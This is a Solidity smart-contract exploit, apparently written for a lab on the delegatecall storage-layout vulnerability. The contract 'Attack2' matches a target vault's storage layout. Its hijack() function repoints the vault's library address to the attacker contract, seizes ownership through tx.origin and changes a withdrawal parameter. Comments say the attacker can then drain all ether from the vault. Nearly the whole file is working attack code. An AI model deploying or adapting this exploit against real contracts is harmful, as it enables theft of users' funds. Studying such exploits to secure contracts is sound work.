// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack2{
    
    // to attack withdrawalVault contract by using the vulnerability of delegatcall, parameters must match in terms of storage layout
    address public numberLibrary; 
    
    uint public currentNumber; 
    
    uint public offsetCounter; 

    address owner;

    address public withdrawalVault;

    // constructor
    constructor(address _withdrawalVault) public {
        withdrawalVault = _withdrawalVault;
    }

    // sets the owner as the Attacker account
    function setOwner() public {
        owner = tx.origin;
    }

    // sets the currenNumber to offset value
    function setCurrentNum(uint offset) public {
        currentNumber = offset;
    }

    // function to hijack the withdrawal vault (attacker accounts become the owner)
    function hijack() public {
       
         // setbase make our address as numlib
        (bool status4,) = withdrawalVault.call(abi.encodeWithSignature("setBase(uint256)", uint256(uint160(address(this)))));
        
        // setowner now we are owner of the withdrawalVault
        (bool status,) =  withdrawalVault.call(abi.encodeWithSignature("setOwner()"));

        // setCurrentNum function assigns the selected integer (50) to currentNumber, now all ether can be withdrawn at once
        (bool status2,) =  withdrawalVault.call(abi.encodeWithSignature("setCurrentNum(uint256)", 50));
    }

    // after calling hijack(), attacker can directly call withdraw() function from the withdrawalVault and steal all ether in the vault
}